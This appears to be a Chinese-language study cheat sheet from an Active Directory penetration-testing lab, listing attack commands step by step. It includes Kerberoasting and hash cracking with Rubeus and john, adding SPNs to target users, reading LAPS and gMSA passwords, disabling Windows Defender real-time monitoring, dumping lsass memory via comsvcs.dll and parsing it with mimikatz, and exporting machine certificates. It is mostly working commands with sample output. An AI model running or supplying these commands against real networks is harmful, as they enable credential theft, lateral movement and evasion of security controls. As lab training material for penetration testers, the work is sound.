# Find-InterestingDomainAcl(pv)

用户
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "studentuser138"}
```

组
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'managers'}
```

域
```
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

# 枚举对某个用户组的ACL(pv)

```
 Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```


# 横向

使用winrs命令横向
```
PS C:\ad\Tools> winrs -r:us-mgmt cmd
```

用powershell直接横向
```
PS C:\ad\Tools>$usmgmt = New-PSSession us-mgmt
PS C:\ad\Tools> Enter-PSSession $usmgmt
```

# kerberoast
请求
```
Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

破解
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

# 设置SPN

前提：对目标用户有GenericAll权限

AD
```
Set-ADUser -Identity Support132User -ServicePrincipalNames @{Add='us/myspn132'} -Verbose
```

pv
```
Set-DomainObject -Identity Support132User -Set @{serviceprincipalname='us/myspn132'} -Verbose
```

查看SPN(ad)
```
Get-ADUser -Identity Support132User -Properties ServicePrincipalName | select ServicePrincipalName
```

Kerberoast 这个spn

```
Rubeus.exe kerberoast /user:Support132User /simple /rc4opsec /outfile:C:\AD\Tools\targetedhashes.txt
```

# LAPS

## 查看对哪台机器有LAPS
```
C:\AD\Tools\Get-LapsPermissions.ps1
```

也可以使用powerview
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

## 读取密码

1. 使用ActiveDirectory module读取密码
```
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

2. 使用LAPS module
引入AdmPwd
```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```

```
Get-AdmPwdPassword -ComputerName us-mailmgmt
```

3. 使用pv
```
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```

# gMSAs

枚举（AD），枚举哪些账号的密码可以被gMSA读取，假设是jumpone
```
Get-ADServiceAccount -Filter *
```

枚举有哪些gMSA可以读取指定账号（上面枚举出来的用户）的密码
```
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

在gMSA的上下文中读取jumpone的哈希(AD)
```
PS C:\Windows\system32> $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
PS C:\Windows\system32> ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
24ea295f3c05aefc8c29d07992cdcc4c
PS C:\Windows\system32>
```

# WDAC

检测WDAC
```
PS C:\Users\jumpone$> Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard


AvailableSecurityProperties                  : {1, 2, 3, 5}
CodeIntegrityPolicyEnforcementStatus         : 2     //注意这里
InstanceIdentifier                           : 4ff40742-2649-41b8-bdd1-e80fad1cce80
RequiredSecurityProperties                   : {0}
SecurityServicesConfigured                   : {0}
SecurityServicesRunning                      : {0}
UsermodeCodeIntegrityPolicyEnforcementStatus : 2    //注意这里
Version                                      : 1.0
VirtualizationBasedSecurityStatus            : 0
VirtualMachineIsolation                      : False
VirtualMachineIsolationProperties            : {0}
PSComputerName                               :
```

表明WDAC 在靶机上运行，这就是powershell处于CLM下的原因

这当前环境下，大多数进攻性的powershell脚本（包括Invoke-mimikatz）不能使用

## 离线dump出lsass里的哈希

这里使用另一种方法dump出靶机上的哈希

首先离线存储lsass.exe里的数据

查看lsass的PID
```
PS C:\Users\jumpone$> tasklist /FI "IMAGENAME eq lsass.exe"
tasklist /FI "IMAGENAME eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      704 Services                   0     17,992 K
```

PID:704

先关闭wd
```
Set-MpPreference -DisableRealtimeMonitoring $true
```


转存lsass的数据到本地

```
C:\Users\jumpone$>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full

C:\Users\jumpone$>dir C:\Users\Public\lsass.dmp
dir C:\Users\Public\lsass.dmp
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\Public

11/01/2022  07:38 AM        47,301,370 lsass.dmp
               1 File(s)     47,301,370 bytes
               0 Dir(s)  16,105,525,248 bytes free
```

已存储到```C:\Users\Public\lsass.dmp```


## mimikatz根据离线文件dump出哈希

```
c:\AD\Tools\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jan  4 2020 18:59:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.DMP
Switch to MINIDUMP : 'C:\AD\Tools\lsass.DMP'

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
```

# dump出证书
```
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

下面路径查看本地的证书

```
ls cert:\LocalMachine\My
```

导出证书
```
ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
```